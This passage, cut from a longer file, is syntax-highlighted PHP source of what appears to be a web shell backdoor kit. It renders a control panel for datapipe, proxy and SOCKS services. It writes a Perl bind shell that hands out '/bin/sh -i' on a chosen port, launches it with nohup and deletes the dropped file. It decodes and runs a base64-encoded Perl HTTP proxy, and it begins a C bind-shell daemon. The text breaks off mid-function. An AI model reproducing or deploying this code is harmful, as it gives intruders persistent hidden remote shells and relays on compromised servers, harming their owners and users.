<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font color=red&amp;gt;&amp;lt;b&amp;gt;Datapipe:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port_1 size=6 value=5547&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; name=datapipe_pl style=&#39;background-color:green;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port_2 value=5553 size=6&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;other serv ip: &amp;lt;input name=ip&amp;gt; port: &amp;lt;input name=port_3 value=5051 size=6&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font color=red&amp;gt;&amp;lt;b&amp;gt;Web proxy:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port size=6 value=5548&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; name=perl_proxy style=&#39;background-color:green;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port size=6 value=5554&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;td&amp;gt;none&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font color=red&amp;gt;&amp;lt;b&amp;gt;Socks 4 serv:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port size=6 value=5549&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port size=6 value=5555&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;none&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font color=red&amp;gt;&amp;lt;b&amp;gt;Socks 5 serv:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port size=6 value=5550&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=port size=6 value=5556&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;none&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;/table&amp;gt;</span>
<span class="s2">&amp;lt;/center&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;&amp;lt;Br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of unix</span>


<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;perl_bd&#39;</span><span class="p">]){</span>
<span class="nv">$port</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="nv">$perl_bd_scp</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="s2">use Socket;</span><span class="se">\$</span><span class="s2">p=</span><span class="si">$port</span><span class="s2">;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));</span>
<span class="s2">setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(</span><span class="se">\$</span><span class="s2">p,INADDR_ANY));</span>
<span class="s2">listen(S,50);while(1){accept(X,S);if(!(</span><span class="se">\$</span><span class="s2">pid=fork)){if(!defined </span><span class="se">\$</span><span class="s2">pid){exit(0);}</span>
<span class="s2">open STDIN,</span><span class="se">\&quot;</span><span class="s2">&amp;lt;&amp;X</span><span class="se">\&quot;</span><span class="s2">;open STDOUT,</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;X</span><span class="se">\&quot;</span><span class="s2">;open STDERR,</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;X</span><span class="se">\&quot;</span><span class="s2">;exec(</span><span class="se">\&quot;</span><span class="s2">/bin/sh -i</span><span class="se">\&quot;</span><span class="s2">);</span>
<span class="s2">close X;}}&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_bd.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$perl_bd_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl /tmp/nst_perl_bd.pl &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_bd.pl&quot;</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp&quot;</span><span class="p">);</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_perl_bd.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$perl_bd_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl .nst_bd_tmp/nst_perl_bd.pl &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_perl_bd.pl&quot;</span><span class="p">);</span>
<span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of start perl_bd</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;perl_proxy&#39;</span><span class="p">]){</span>
<span class="nv">$port</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="nv">$perl_proxy_scp</span> <span class="o">=</span> <span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4vcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtIGh0dHAgcHJveHkgc2VydmVyLiB6YXB1c2thamVtOiBwZXJsIHByb3h5LnBsCTgxODEgbHVib2ogcG9ydCB2aTZpIDEwMjQtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KI3JlcXVpcmUgInN5cy9zb2NrZXQucGgiOw0KdXNlIFNvY2tldDsNCnNyYW5kICh0aW1lfHwkJCk7DQojLS0tICBEZWZpbmUgYSBmcmllbmRseSBleGl0IGhhbmRsZXINCiRTSUd7J0tJTEwnfSA9ICRTSUd7UVVJVH0gPSAkU0lHe0lOVH0gPSAnZXhpdF9oYW5kbGVyJzsNCnN1YiBleGl0X2hhbmRsZXIgew0KICAgIHByaW50ICJcblxuIC0tLSBQcm94eSBzZXJ2ZXIgaXMgZHlpbmcgLi4uXG5cbiI7DQogICAgY2xvc2UoU09DS0VUKTsNCiAgICBleGl0Ow0KDQp9DQojLS0tICBTZXR1cCBzb2NrZXQNCg0KJHwgPSAxOw0KJHByb3h5X3BvcnQgPSBzaGlmdChAQVJHVik7DQokcHJveHlfcG9ydCA9IDgxODEgdW5sZXNzICRwcm94eV9wb3J0ID1+IC9cZCsvOw0KDQokc29ja2V0X2Zvcm1hdCA9ICdTIG4gYTQgeDgnOw0KJmxpc3Rlbl90b19wb3J0KFNPQ0tFVCwgJHByb3h5X3BvcnQpOw0KJGxvY2FsX2hvc3QgPSBgaG9zdG5hbWVgOw0KY2hvcCgkbG9jYWxfaG9zdCk7DQokbG9jYWxfaG9zdF9pcCA9IChnZXRob3N0YnluYW1lKCRsb2NhbF9ob3N0KSlbNF07DQpwcmludCAiIC0tLSBQcm94eSBzZXJ2ZXIgcnVubmluZyBvbiAkbG9jYWxfaG9zdCBwb3J0OiAkcHJveHlfcG9ydCBcblxuIjsNCiMtLS0gIExvb3AgZm9yZXZlciB0YWtpbmcgcmVxdWVzdHMgYXMgdGhleSBjb21lDQp3aGlsZSAoMSkgew0KIy0tLSAgV2FpdCBmb3IgcmVxdWVzdA0KICAgIHByaW50ICIgLS0tIFdhaXRpbmcgdG8gYmUgb2Ygc2VydmljZSAuLi5cbiI7DQogICAgKCRhZGRyID0gYWNjZXB0KENISUxELFNPQ0tFVCkpIHx8IGRpZSAiYWNjZXB0ICQhIjsNCiAgICAoJHBvcnQsJGluZXRhZGRyKSA9ICh1bnBhY2soJHNvY2tldF9mb3JtYXQsJGFkZHIpKVsxLDJdOw0KICAgIEBpbmV0YWRkciA9IHVucGFjaygnQzQnLCRpbmV0YWRkcik7DQogICAgcHJpbnQgIkNvbm5lY3Rpb24gZnJvbSAiLCBqb2luKCIuIiwgQGluZXRhZGRyKSwgIiAgcG9ydDogJHBvcnQgXG4iOw0KIy0tLSAgRm9yayBhIHN1YnByb2Nlc3MgdG8gaGFuZGxlIHJlcXVlc3QuDQojLS0tICBQYXJlbnQgcHJvY2VzIGNvbnRpbnVlcyBsaXN0ZW5pbmcuDQogICAgaWYgKGZvcmspIHsNCgl3YWl0OwkJIyBGb3Igbm93IHdlIHdhaXQgZm9yIHRoZSBjaGlsZCB0byBmaW5pc2gNCgluZXh0OwkJIyBXZSB3YWl0IHNvIHRoYXQgcHJpbnRvdXRzIGRvbid0IG1peA0KICAgIH0NCiMtLS0gIFJlYWQgZmlyc3QgbGluZSBvZiByZXF1ZXN0IGFuZCBhbmFseXplIGl0Lg0KIy0tLSAgUmV0dXJuIGFuZCBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QgbWV0aG9kLg0KICAgKCRmaXJzdCwkbWV0aG9kKSA9ICZhbmFseXplX3JlcXVlc3Q7DQojLS0tICBTZW5kIHJlcXVlc3QgdG8gcmVtb3RlIGhvc3QNCiAgICBwcmludCBVUkwgJGZpcnN0Ow0KICAgIHByaW50ICRmaXJzdDsNCiAgICB3aGlsZSAoPENISUxEPikgew0KCXByaW50ICRfOw0KCW5leHQgaWYgKC9Qcm94eS1Db25uZWN0aW9uOi8pOw0KCXByaW50IFVSTCAkXzsNCglsYXN0IGlmICgkXyA9fiAvXltcc1x4MDBdKiQvKTsNCiAgICB9DQogICAgaWYgKCRtZXRob2QgZXEgIlBPU1QiKSB7DQoJJGRhdGEgPSA8Q0hJTEQ+Ow0KCXByaW50ICRkYXRhOw0KCXByaW50IFVSTCAkZGF0YTsNCiAgICB9DQogICAgcHJpbnQgVVJMICJcbiI7DQojLS0tICBXYWl0IGZvciByZXNwb25zZSBhbmQgdHJhbnNmZXIgaXQgdG8gcmVxdWVzdG9yLg0KICAgIHByaW50ICIgLS0tIERvbmUgc2VuZGluZy4gUmVzcG9uc2U6IFxuXG4iOw0KICAgICRoZWFkZXIgPSAxOw0KICAgICR0ZXh0ID0gMDsNCiAgICB3aGlsZSAoPFVSTD4pIHsNCglwcmludCBDSElMRCAkXzsNCglpZiAoJGhlYWRlciB8fCAkdGV4dCkgewkgICAgICMgT25seSBwcmludCBoZWFkZXIgJiB0ZXh0IGxpbmVzIHRvIFNURE9VVA0KCSAgICBwcmludCAkXzsNCgkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15bXHNceDAwXSokLykgew0KCQkkaGVhZGVyID0gMDsNCgkgICAgfQ0KIwkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15Db250ZW50LXR5cGU6IHRleHQvKSB7DQojCQkkdGV4dCA9IDE7DQojCSAgICB9DQoJfQ0KICAgIH0NCiAgICBjbG9zZShVUkwpOw0KICAgIGNsb3NlKENISUxEKTsNCiAgICBleGl0OwkJCSMgRXhpdCBmcm9tIGNoaWxkIHByb2Nlc3MNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0JYW5hbHl6ZV9yZXF1ZXN0CQkJCQkJCS0tDQojLS0JCQkJCQkJCQktLQ0KIy0tCUFuYWx5emUgYSBuZXcgcmVxdWVzdC4gIEZpcnN0IHJlYWQgaW4gZmlyc3QgbGluZSBvZiByZXF1ZXN0LgktLQ0KIy0tCVJlYWQgVVJMIGZyb20gaXQsIHByb2Nlc3MgVVJMIGFuZCBvcGVuIGNvbm5lY3Rpb24uCQktLQ0KIy0tCVJldHVybiBhbiBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QJLS0NCiMtLQltZXRob2QuCQkJCQkJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBhbmFseXplX3JlcXVlc3Qgew0KIy0tLSAgUmVhZCBmaXJzdCBsaW5lIG9mIEhUVFAgcmVxdWVzdA0KICAgICRmaXJzdCA9IDxDSElMRD47DQoNCiAgICAkdXJsID0gKCRmaXJzdCA9fiBtfChodHRwOi8vXFMrKXwpWzBdOw0KICAgIHByaW50ICJSZXF1ZXN0IGZvciBVUkw6ICAkdXJsIFxuIjsNCg0KIy0tLSAgQ2hlY2sgaWYgZmlyc3QgbGluZSBpcyBvZiB0aGUgZm9ybSBHRVQgaHR0cDovL2hvc3QtbmFtZSAuLi4NCiAgICAoJG1ldGhvZCwgJHJlbW90ZV9ob3N0LCAkcmVtb3RlX3BvcnQpID0gDQoJKCRmaXJzdCA9fiBtIShHRVR8UE9TVHxIRUFEKSBodHRwOi8vKFteLzpdKyk6PyhcZCopISApOw0KIy0tLSAgSWYgbm90LCBiYWQgcmVxdWVzdC4NCiAgICANCiAgICBpZiAoISRyZW1vdGVfaG9zdCkgew0KCXByaW50ICRmaXJzdDsNCgl3aGlsZSAoPENISUxEPikgew0KCSAgICBwcmludCAkXzsNCgkgICAgbGFzdCBpZiAoJF8gPX4gL15bXHNceDAwXSokLyk7DQoJfQ0KCXByaW50ICJJbnZhbGlkIEhUVFAgcmVxdWVzdCBmcm9tICIsIGpvaW4oIi4iLCBAaW5ldGFkZHIpLCAiXG4iOw0KIwlwcmludCBDSElMRCAiQ29udGVudC10eXBlOiB0ZXh0L3BsYWluIiwiXG5cbiI7DQoJcHJpbnQgQ0hJTEQgIkkgZG9uJ3QgdW5kZXJzdGFuZCB5b3VyIHJlcXVlc3QuXG4iOw0KCWNsb3NlKENISUxEKTsNCglleGl0Ow0KICAgIH0NCiMtLS0gIElmIHJlcXVlc3RlZCBVUkwgaXMgdGhlIHByb3h5IHNlcnZlciB0aGVuIGlnbm9yZSByZXF1ZXN0DQogICAgJHJlbW90ZV9pcCA9IChnZXRob3N0YnluYW1lKCRyZW1vdGVfaG9zdCkpWzRdOw0KICAgIGlmICgoJHJlbW90ZV9pcCBlcSAkbG9jYWxfaG9zdF9pcCkgJiYgKCRyZW1vdGVfcG9ydCBlcSAkcHJveHlfcG9ydCkpIHsNCglwcmludCAkZmlyc3Q7DQoJd2hpbGUgKDxDSElMRD4pIHsNCgkgICAgcHJpbnQgJF87DQoJICAgIGxhc3QgaWYgKCRfID1+IC9eW1xzXHgwMF0qJC8pOw0KCX0NCglwcmludCAiIC0tLSBDb25uZWN0aW9uIHRvIHByb3h5IHNlcnZlciBpZ25vcmVkLlxuIjsNCiMJcHJpbnQgQ0hJTEQgIkNvbnRlbnQtdHlwZTogdGV4dC9wbGFpbiIsIlxuXG4iOw0KCXByaW50IENISUxEICJJdCdzIG5vdCBuaWNlIHRvIG1ha2UgbWUgbG9vcCBvbiBteXNlbGYhLlxuIjsNCgljbG9zZShDSElMRCk7DQoJZXhpdDsNCiAgICB9DQojLS0tICBTZXR1cCBjb25uZWN0aW9uIHRvIHRhcmdldCBob3N0IGFuZCBzZW5kIHJlcXVlc3QNCiAgICAkcmVtb3RlX3BvcnQgPSAiaHR0cCIgdW5sZXNzICgkcmVtb3RlX3BvcnQpOw0KICAgICZvcGVuX2Nvbm5lY3Rpb24oVVJMLCAkcmVtb3RlX2hvc3QsICRyZW1vdGVfcG9ydCk7DQojLS0tICBSZW1vdmUgcmVtb3RlIGhvc3RuYW1lIGZyb20gVVJMDQogICAgICAgICRmaXJzdCA9fiBzL2h0dHA6XC9cL1teXC9dKy8vOw0KICAgICgkZmlyc3QsICRtZXRob2QpOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLQlsaXN0ZW5fdG9fcG9ydChTT0NLRVQsICRwb3J0KQkJCQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgbGlzdGVucyB0byBhIHNwZWNpZmljIHBvcnQJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBsaXN0ZW5fdG9fcG9ydCB7DQogICAgbG9jYWwgKCRwb3J0KSA9ICRfWzFdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIsICRtYXhfcmVxdWVzdHMpOw0KICAgICRtYXhfcmVxdWVzdHMgPSAzOwkJIyBNYXggbnVtYmVyIG9mIG91dHN0YW5kaW5nIHJlcXVlc3RzDQogICAgJHNvY2tldF9mb3JtYXQgPSAnUyBuIGE0IHg4JzsNCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcGFja2VkX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICJcMFwwXDBcMCIpOw0KICAgIHNvY2tldCgkX1swXSwgJlBGX0lORVQsICZTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUgInNvY2tldDogJCEiOw0KICAgIGJpbmQoJF9bMF0sICRwYWNrZWRfcG9ydCkgfHwgZGllICJiaW5kOiAkISI7DQogICAgbGlzdGVuKCRfWzBdLCAkbWF4X3JlcXVlc3RzKSB8fCBkaWUgImxpc3RlbjogJCEiOw0KICAgICRjdXIgPSBzZWxlY3QoJF9bMF0pOyAgDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQogICAgfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIy0tCW9wZW5fY29ubmVjdGlvbihTT0NLRVQsICRyZW1vdGVfaG9zdG5hbWUsICRwb3J0KQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgY29ubmVjdHMgdG8gYSBjZXJ0YWluIGhvc3QJCQktLQ0KIy0tCSRsb2NhbF9ob3N0X2lwIGlzIGFzc3VtZWQgdG8gYmUgbG9jYWwgaG9zdG5hbWUgSVAgYWRkcmVzcwktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBvcGVuX2Nvbm5lY3Rpb24gew0KICAgIGxvY2FsICgkcmVtb3RlX2hvc3RuYW1lLCAkcG9ydCkgPSBAX1sxLDJdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIpOw0KICAgIGxvY2FsICgkcmVtb3RlX2FkZHIsIEByZW1vdGVfaXAsICRyZW1vdGVfaXApOw0KICAgIGxvY2FsICgkbG9jYWxfcG9ydCwgJHJlbW90ZV9wb3J0KTsNCiAgICBpZiAoJHBvcnQgIX4gL15cZCskLykgew0KCSRwb3J0ID0gKGdldHNlcnZieW5hbWUoJHBvcnQsICJ0Y3AiKSlbMl07DQoJJHBvcnQgPSA2NjY3IHVubGVzcyAoJHBvcnQpOw0KICAgIH0NCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcmVtb3RlX2FkZHIgPSAoZ2V0aG9zdGJ5bmFtZSgkcmVtb3RlX2hvc3RuYW1lKSlbNF07DQogICAgaWYgKCEkcmVtb3RlX2FkZHIpIHsNCglkaWUgIlVua25vd24gaG9zdDogJHJlbW90ZV9ob3N0bmFtZSI7DQogICAgfQ0KDQogICAgQHJlbW90ZV9pcCA9IHVucGFjaygiQzQiLCAkcmVtb3RlX2FkZHIpOw0KICAgICRyZW1vdGVfaXAgPSBqb2luKCIuIiwgQHJlbW90ZV9pcCk7DQogICAgcHJpbnQgIkNvbm5lY3RpbmcgdG8gJHJlbW90ZV9pcCBwb3J0ICRwb3J0LlxuXG4iOw0KICAgICRzb2NrZXRfZm9ybWF0ID0gJ1MgbiBhNCB4OCc7DQogICAgJGxvY2FsX3BvcnQgID0gcGFjaygkc29ja2V0X2Zvcm1hdCwgJkFGX0lORVQsIDAsICRsb2NhbF9ob3N0X2lwKTsNCiAgICAkcmVtb3RlX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICRyZW1vdGVfYWRkcik7DQogICAgc29ja2V0KCRfWzBdLCAmQUZfSU5FVCwgJlNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAic29ja2V0OiAkISI7DQogICAgYmluZCgkX1swXSwgJGxvY2FsX3BvcnQpIHx8IGRpZSAiYmluZDogJCEiOw0KICAgIGNvbm5lY3QoJF9bMF0sICRyZW1vdGVfcG9ydCkgfHwgZGllICJzb2NrZXQ6ICQhIjsNCiAgICAkY3VyID0gc2VsZWN0KCRfWzBdKTsgIA0KDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQp9DQoNCg==&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_proxy.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$perl_proxy_scp</span><span class="p">));</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl /tmp/nst_perl_proxy.pl </span><span class="si">$port</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_proxy.pl&quot;</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_proxy_tmp&quot;</span><span class="p">);</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_proxy_tmp/nst_perl_proxy.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$perl_proxy_scp</span><span class="p">));</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl .nst_proxy_tmp/nst_perl_proxy.pl </span><span class="si">$port</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_proxy_tmp/nst_perl_proxy.pl&quot;</span><span class="p">);</span>
<span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_proxy_tmp&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of start perl_proxy</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c_bd&#39;</span><span class="p">]){</span>
<span class="nv">$port</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="nv">$c_bd_scp</span> <span class="o">=</span> <span class="s2">&quot;#define PORT </span><span class="si">$port</span><span class="s2"></span>
<span class="s2">#include &amp;lt;stdio.h&amp;gt;</span>
<span class="s2">#include &amp;lt;signal.h&amp;gt;</span>
<span class="s2">#include &amp;lt;sys/types.h&amp;gt;</span>
<span class="s2">#include &amp;lt;sys/socket.h&amp;gt;</span>
<span class="s2">#include &amp;lt;netinet/in.h&amp;gt;</span>

<span class="s2">int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;</span>
<span class="s2">struct sockaddr_in serv_addr;</span>
<span class="s2">struct sockaddr_in client_addr;</span>

<span class="s2">int main ()</span>
<span class="s2">{</span>
<span class="s2">    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span>
<span class="s2">    if (soc_des == -1)</span>
<span class="s2">        exit(-1);</span>
<span class="s2">    bzero((char *) &amp;serv_addr, sizeof(serv_addr));</span>
<span class="s2">    serv_addr.sin_family = AF_INET;</span>
<span class="s2">    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span>
<span class="s2">    serv_addr.sin_port = htons(PORT);</span>
<span class="s2">    soc_rc = bind(soc_des, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr));</span>
<span class="s2">    if (soc_rc != 0)</span>
<span class="s2">        exit(-1);</span>
<span class="s2">    if (fork() != 0)</span>
<span class="s2">        exit(0);</span>
<span class="s2">    setpgrp();</span>
<span class="s2">    signal(SIGHUP, SIG_IGN);</span>
<span class="s2">    if (fork() != 0)</span>
<span class="s2">        exit(0);</span>
<span class="s2">    soc_rc = listen(soc_des, 5);</span>
<span class="s2">    if (soc_rc != 0)</span>
<span class="s2">        exit(0);</span>
<span class="s2">    while (1) {</span>
<span class="s2">        soc_len = sizeof(client_addr);</span>
